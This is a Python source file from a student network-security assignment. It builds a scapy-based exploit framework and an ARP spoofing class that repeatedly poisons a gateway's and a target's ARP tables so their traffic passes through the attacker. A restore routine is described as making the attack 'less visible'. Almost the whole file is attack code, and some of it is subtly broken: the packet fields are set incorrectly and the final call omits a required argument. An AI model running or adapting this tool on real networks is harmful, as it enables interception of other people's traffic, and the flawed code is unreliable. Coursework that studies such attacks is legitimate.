# /usr/bin/python3

'''
ICT2203 Networking Security: Assignment 1

2003109 Jared Marc Song Kye-Jet
2003XXX Low Weiyang
2003XXX Amos Ng Zheng Jie
2003XXX Kuo Eugene

todo:
- add more exploits
- add method to call exploits similar to msfconsole
'''

from scapy.all import *
from time import sleep
import logging
import argparse

logging.basicConfig(level=logging.INFO)

MAC_BROADCAST = "ff:ff:ff:ff:ff:ff"
IPV4_BROADCAST = "255.255.255.255"

class Exploit(object):
	'''
	Every exploit follows standard structure
	- an init() method to setup the exploit
	- an exploit() method to actually run the exploit
	- a restore() method to undo the exploit, if persistent changes are made to the network
	'''
	def __init__(self):
		self.get_own_mac()
		self.params = dict()

	def exploit(self):
		pass

	def restore(self):
		pass

	def show_params(self):
		for param, value in self.params.items():
			print(f"{param} => {value}")

	'''
	We also implement some utility methods that exploits can use.
	'''
	def get_own_mac(self):
		'''
		Returns own MAC address
		'''
		self.own_mac = Ether().src

	def mac_from_ip(self, ip: str) -> str:
		'''
		Utility method for layer 2 exploits: resolves an IP to a MAC using ARP.
		'''
		arp_broadcast = Ether(dst=MAC_BROADCAST)/ARP(op=1, pdst=ip)
		recv_packets = srp(arp_broadcast, timeout=2, verbose=0)
		return recv_packets[0][0][1].hwsrc
		

class ARPSpoof(Exploit):
	'''
	This exploit implements a basic ARP spoofing attack - by overwriting the ARP tables of the gateway and target, all packets travelling between the two will be routed through our host.
	As the ARP tables of the target host and gateway will be overwritten, the restore method is necessary.

	'''
	def __init__(self, gateway_ip: str, target_ip: str, verbosity: int, delay):
		super().__init__()

		self.verbosity = verbosity
		self.gateway_ip = gateway_ip
		self.target_ip = target_ip
		self.delay = delay

		self.gateway_mac = self.mac_from_ip(gateway_ip)
		self.target_mac = self.mac_from_ip(target_ip)

		self.run = True # boolean to handle exploit loop 

		logging.info(f"Target IP: {self.target_ip}")
		logging.info(f"Gateway IP: {self.gateway_ip}")
		logging.info(f"Target MAC: {self.target_mac}")
		logging.info(f"Gateway MAC: {self.gateway_mac}")

	def exploit(self):
		'''
		As ARP tables have a decay timing, to perpetutate this attack packets need to be constantly sent.
		'''
		logging.info(f"Beginning ARP spoofing attack on {self.target_ip}")

		target_arp_pkt = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=self.own_mac)
		gateway_arp_pkt = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst=self.gateway_mac)

		while self.run:
			try:
				send(target_arp_pkt, verbose=0)
				sleep(self.delay)
				send(gateway_arp_pkt, verbose=0)
				sleep(self.delay)
			except KeyboardInterrupt:
				logging.info("Ending ARP spoofing exploit...")
				self.run = False
				self.restore()

	def restore(self):
		'''
		Even though the MAC tables will eventually restore themselves, we call this method to make our attack less visible.
		'''
		logging.info(f"Restoring original ARP tables...")

		target_arp_pkt = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=self.gateway_mac)
		gateway_arp_pkt = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst=self.target_mac)

		for repeat in range(5): # randomly chosen constant as of now
			send(target_arp_pkt)
			sleep(self.delay)
			send(gateway_arp_pkt)
			sleep(self.delay)

		logging.info("ARP table restore complete!")

	
if __name__ == '__main__':
	e = ARPSpoof("10.0.0.1", "10.0.0.2", 2)
